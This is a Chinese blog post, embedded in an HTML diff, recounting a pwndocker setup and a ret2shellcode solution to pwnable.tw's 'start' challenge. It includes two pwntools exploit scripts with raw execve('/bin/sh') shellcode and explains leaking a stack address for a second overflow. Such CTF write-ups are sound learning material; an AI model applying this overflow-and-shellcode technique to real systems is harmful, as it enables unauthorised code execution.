@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+
+  <title>pwndocker的pwn题体验（上） | Rin</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="Rin">
+    <meta name="author" content="Rin777">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="Rin" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"><link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
+<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            
+        	<li>
+        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
+            	<ul class="sb-submenu">
+				  	
+				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Generalization/" class="animsition-link">Generalization<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP/" class="animsition-link">HEAP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Fastbin-Attack/" class="animsition-link">HEAP - Fastbin Attack<small>(9)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Heap-overflow/" class="animsition-link">HEAP - Heap overflow<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-House-Of-Force/" class="animsition-link">HEAP - House Of Force<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Off-By-One/" class="animsition-link">HEAP - Off By One<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Tcache/" class="animsition-link">HEAP - Tcache<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Unlink/" class="animsition-link">HEAP - Unlink<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Unsortedbin/" class="animsition-link">HEAP - Unsortedbin<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(18)</small></a></li>
+				    
+				    <li><a href="/categories/OTHER-IO-FILE/" class="animsition-link">OTHER - IO FILE<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/PWN-COLLEGE/" class="animsition-link">PWN.COLLEGE<small>(11)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ARRAY-OUT-OF-BOUNDS/" class="animsition-link">STACK - ARRAY OUT OF BOUNDS<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-DynELF/" class="animsition-link">STACK - DynELF<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Format/" class="animsition-link">STACK - Format<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-OTHERS/" class="animsition-link">STACK - OTHERS<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ROP/" class="animsition-link">STACK - ROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-SROP/" class="animsition-link">STACK - SROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Stack-Overflow/" class="animsition-link">STACK - Stack Overflow<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2dlreslove/" class="animsition-link">STACK - ret2dlreslove<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2dlresolve/" class="animsition-link">STACK - ret2dlresolve<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2shellcode/" class="animsition-link">STACK - ret2shellcode<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-sandbox/" class="animsition-link">STACK - sandbox<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/mess/" class="animsition-link">mess<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/幻想曲/" class="animsition-link">幻想曲<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/深夜高速/" class="animsition-link">深夜高速<small>(1)</small></a></li>
+				    
+				</ul>
+        	</li>
+			
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://weibo.com/u/1682818607" class="animsition-link">没有营养的推广页</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="http://www.2323bb.ltd" class="animsition-link">cc_sakura</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36995313" class="animsition-link">F@LLe0</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://yyz9.cn" class="animsition-link">YYZ</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://www.star123.top" class="animsition-link">star</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="javascript:;" class="popup-trigger" title="Search"><span class="search-icon"></span>Search</a></li>
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0282.jpg" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">Rin</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            
+                            
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2021-11-02T14:54:29.012Z" itemprop="datePublished">
+          2021-11-02
+      </time>
+    
+    
+    | 
+    <a href='/tags/pwnable/'>pwnable</a>
+    
+    
+</span>
+                <h1>pwndocker的pwn题体验（上）</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		
+    <div id="aplayer-yTqyMpUO" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
+
+<h3><span id="1前言">1）前言</span></h3><p>​        之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>
+<h3><span id="2pwndocker启动">2）pwndocker启动</span></h3><p>​        首先是如何build pwndocker的问题。</p>
+<p>​        如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>
+<p>​        这里参考一篇博客的做法：<a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80">skysider/pwndocker 正确使用姿势</a>。</p>
+<p>​        <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>
+<p>​        拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>
+<p>​        然后可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--rm \</span><br><span class="line">-h <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">--name <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">-v $(<span class="built_in">pwd</span>)/<span class="variable">$&#123;ctf_name&#125;</span>:/ctf/work \</span><br><span class="line">-p 23947:23947 \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">--privileged \</span><br><span class="line">pwn</span><br></pre></td></tr></table></figure>
+
+<p>​        运行镜像。</p>
+<p>​        但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code> docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png" alt="截屏2021-11-03 下午5.00.25"></p>
+<p>​    </p>
+<p>​        我们可以先用<code>docker cp</code>来将题目的文件拷贝至容器中。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png" alt="截屏2021-11-03 下午10.05.57"></p>
+<p>​    </p>
+<p>​        关于<code>docker cp</code>指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。</p>
+<p>​        如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过<code>docker run</code>指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过<code>docker start</code>和<code>docker attach</code>来进入容器就行。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png" alt="截屏2021-11-03 下午10.14.12"></p>
+<p>​        愉快的gdb时间（（</p>
+<p>​        还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>
+<p>​        然后是做题时间。</p>
+<p>​        这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png" alt="截屏2021-11-03 下午11.01.29"></p>
+<p>​    </p>
+<p>​        ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>
+<p>​        然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>
+<p>​        还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>
+<p>​        但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>
+<p>​        后来重启一次之后就能立即同步到容器中了。好。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png" alt="截屏2021-11-03 下午11.16.05"></p>
+<p>​        有一点离谱。</p>
+<p>​        虽然但是，我超，pwndokcer真的好用。</p>
+<p>​        鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>
+<p>​        所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>
+<p>​        然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>
+<p>​        shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span></span><br><span class="line">payload += shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>​    摸了一圈，又EOF力。</p>
+<p>​    换了祖传exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0xffffd284</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> </span><br><span class="line">payload += p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span></span><br><span class="line">payload += p32(stack_addr+<span class="number">20</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png" alt="截屏2021-11-04 上午9.49.21">    </p>
+<p>​        所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。</p>
+<p>​        shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。</p>
+<p>​        在调试的时候又出现了新问题。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png" alt="截屏2021-11-04 上午10.01.04">    </p>
+<p>​        搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。</p>
+<p>​        在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。</p>
+<p>​        这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。</p>
+<p>​        虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。</p>
+<p>​        这里留个疑点吧。</p>
+<p>​        还是回到题目本身。也就是无法<code>gdb.attach()</code>的问题。</p>
+<p>​        原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。</p>
+<p>​        我傻了。坑是真的多。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png" alt="截屏2021-11-04 下午5.30.51"></p>
+<p>​        果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。</p>
+<p>​        在修改源码后解决问题，详情可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43483799/article/details/118885208?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案</a>。</p>
+<p>​        解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。</p>
+<p>​        百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。</p>
+<p>​        对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。</p>
+<h3><span id><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png"></span></h3><p>​    </p>
+<p>​    </p>
+<p>​        尝试了一下一种新的下断点方式。    </p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png" alt="截屏2021-11-04 下午7.43.49"></p>
+<p>​        回到题目，很显然如果摁执行shellcode，就根本没有反应（（</p>
+<p>​        eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。</p>
+<p>​        新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。</p>
+<p>​        好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的）</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png" alt="截屏2021-11-04 下午9.42.37"></p>
+<p>​        这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后</p>
+<p>ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。</p>
+<p>​        (真有够麻烦的)</p>
+<h3><span id="3漏洞利用">3）漏洞利用</span></h3><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png" alt="截屏2021-11-04 下午9.50.04">        </p>
+<p>​        看一下发现不对头，这个返回地址是我们的shellcode。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png" alt="image-20211104215119020"></p>
+<p>​        按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。</p>
+<p>​        然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。</p>
+<p>​        那么我们要retn到哪里呢？</p>
+<p>​        既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。</p>
+<p>​        既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用<code>sys_write</code></p>
+<p>对栈上内存进行一个读取。</p>
+<p>​        那么如何利用捏。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png" alt="截屏2021-11-04 下午10.00.26">            </p>
+<p>​        从这里我们可以清楚地看到，这几条指令分别设置了<code>sys_write</code>的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。</p>
+<p>​        <code> mov  ecx, esp</code>将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。</p>
+<p>​        </p>
+<p>![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png)        </p>
+<p>​        其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png" alt="截屏2021-11-04 下午10.11.55"></p>
+<p>​        当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。</p>
+<p>​        这时候程序还是会按照原有的指令执行，比如说下一个<code>sys_read</code>函数。</p>
+<p>​        这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，<code>sys_read</code>会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20）</p>
+<p>​        然后直接溢出到栈地址。</p>
+<p>​        执行shellcode</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.23.43.png" alt="截屏2021-11-04 下午10.23.18"></p>
+<p>​            hhx</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png" alt="截屏2021-11-04 下午10.24.07"></p>
+<h3><span id="4总结">4）总结</span></h3><p>​        这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。</p>
+<p>​        动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！</p>
+<p>​        另外容器要记得及时备份55.</p>
+<p>​        还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。</p>
+<p>​</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="../../07/stack_learningsrop%E5%AD%A6%E4%B9%A0/" style="float: left;">
+        ← SROP学习
+    </a>
+    
+    
+    <a class="pull-right" href="../../../10/31/mess_%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/">
+        基于ctf pwn环境的docker搭建 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+<!-- Highlight.js -->
+
+<link rel="stylesheet"
+href="//highlightjs.org/static/demo/styles/atom-one-light.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
+</script>
+<script>
+hljs.initHighlightingOnLoad();
+
+</script>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By Rin777. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+            <style>
+.local-search-popup {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  padding: 0;
+  background: rgba(255, 255, 255, .9);
+  color: #333;
+  z-index: 9999;
